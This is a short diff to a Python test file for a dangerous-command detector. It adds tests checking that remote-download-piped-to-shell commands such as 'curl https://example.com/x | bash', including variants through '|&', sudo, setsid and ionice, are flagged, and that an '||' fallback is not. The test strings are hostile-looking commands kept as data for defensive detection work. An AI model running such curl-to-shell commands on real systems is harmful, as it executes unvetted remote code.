@@ -99,6 +99,17 @@ class TestPipeRemoteToShellPattern:
         detect_dangerous_command(command)
         assert time.perf_counter() - start < 3
 
+    def test_or_list_is_not_a_pipe_for_the_widened_sink(self):
+        pipe = "|"
+        assert not self._hits(f"curl -f https://example.com/x {pipe}{pipe} sudo bash fallback.sh")
+        assert self._hits(f"curl -f https://example.com/x {pipe}{pipe} true {pipe} sudo bash")
+        assert self._hits(f"curl https://example.com/x {pipe}& sudo bash")
+
+    def test_setsid_and_ionice_launchers_flagged(self):
+        pipe = "|"
+        for launcher in ("setsid -w", "ionice -c3", "sudo setsid"):
+            assert self._hits(f"curl https://example.com/x {pipe} {launcher} bash"), launcher
+
 
 class TestSourceProcessSubstitution:
     def test_source_and_dot_of_remote_process_sub_flagged(self):
